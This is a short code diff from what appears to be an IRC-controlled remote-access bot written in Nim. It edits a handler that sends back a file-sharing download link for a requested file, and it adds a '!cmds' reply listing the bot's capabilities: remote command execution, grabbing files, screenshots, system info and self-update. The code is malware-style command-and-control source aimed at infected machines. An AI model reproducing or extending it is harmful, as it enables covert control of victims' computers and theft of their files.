@@ -162,7 +162,7 @@ proc cmd_getFileIO(event:IrcEvent, client:AsyncIrc, tokens:seq[string]) {.async.
                 try:
                     var json_data = parseJson(output)
                     var download_link = json_data["link"].str
-                    client.privmsg(event.origin, "you have 1 hour: " & download_link)
+                    client.privmsg(event.origin, "you have 1 attpemt, 1 hour: " & download_link)
                 except:
                     client.privmsg(event.origin, "parsing error, you have 1 hour: " & output)
             else:
@@ -172,7 +172,6 @@ proc cmd_getFileIO(event:IrcEvent, client:AsyncIrc, tokens:seq[string]) {.async.
     else:
         when defined(debug): echo "File missing"
         client.privmsg(event.origin, "i dont see it")
-
 
 
 
@@ -442,5 +441,8 @@ proc cmdh_handle*(event:IrcEvent, client:AsyncIrc):void {.thread.} =
         discard cmd_setSendSleep(event, client, tokens)
     of "!screenshot":
         discard cmd_screenshot(event, client)
+    of "!cmds":
+        discard client.privmsg(event.origin, "hey, lag, excessFlood, dxdiag, r <cmd>, getfio <file>, get <file>, print <file<, update, forceupdate, sendsleep <integer>, screenshot, cmds")
+
 
         
